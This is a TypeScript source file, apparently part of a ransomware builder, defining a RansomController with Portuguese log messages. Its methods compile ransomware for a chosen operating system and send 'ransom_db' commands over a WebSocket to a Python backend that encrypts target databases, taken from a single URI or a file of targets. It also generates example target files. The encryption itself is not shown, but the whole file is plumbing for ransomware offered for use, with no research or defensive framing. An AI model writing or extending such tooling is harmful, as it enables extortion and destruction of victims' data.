import type { IRansomController, RansomBuildDTO, RansomDbDTO, RansomExampleDTO, DbTarget } from "../../application/ransom/IRansomController.js";
import type { CompileRansomUseCase } from "../../application/ransom/use-cases/CompileRansomUseCase.js";
import type { IPythonWsClient } from "../../domain/ports/IPythonWsClient.js";
import type { RansomSO } from "../../domain/ports/IRansomCompiler.js";
import type { Result } from "../../shared/Result.js";
import { Result as R } from "../../shared/Result.js";

export class RansomController implements IRansomController {
  constructor(
    private readonly _compileUseCase: CompileRansomUseCase,
    private readonly _wsClient: IPythonWsClient,
  ) {}


  compile(
    so: RansomSO,
    onLog: (msg: string) => void,
  ): Promise<Result<RansomBuildDTO>> {
    return this._compileUseCase.execute(so, onLog);
  }


  async encryptDb(
    db: DbTarget,
    mode: "single" | "file",
    source: string,
    onLog: (msg: string) => void,
  ): Promise<Result<RansomDbDTO>> {
    const unsubscribe = this._wsClient.onEvent((event) => {
      if (event.event === "ransom_db_log") {
        const msg = (event.data as { msg?: string })?.msg;
        if (msg) onLog(msg);
      }
    });

    try {
      const label = mode === "single" ? `URI: ${source}` : `Arquivo: ${source}`;
      onLog(`[*] Enviando ransom_db → Python (${db} · ${label})`);

      const payload =
        mode === "single"
          ? { db, mode, uri: source }
          : { db, mode, file_path: source };

      const res = await this._wsClient.send("ransom_db", payload);

      if (!res.success) {
        return R.fail(res.error ?? "Erro desconhecido no servidor Python");
      }

      return R.ok(res.data as RansomDbDTO);
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      return R.fail(`Falha na conexão WS: ${msg}`);
    } finally {
      unsubscribe();
    }
  }


  async generateExample(
    db: DbTarget,
    outputPath: string,
  ): Promise<Result<RansomExampleDTO>> {
    try {
      const res = await this._wsClient.send("ransom_db", {
        db,
        mode: "example",
        output_path: outputPath,
      });
      if (!res.success) {
        return R.fail(res.error ?? "Erro desconhecido no servidor Python");
      }
      return R.ok({ filePath: outputPath, db });
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      return R.fail(`Falha na conexão WS: ${msg}`);
    }
  }
}

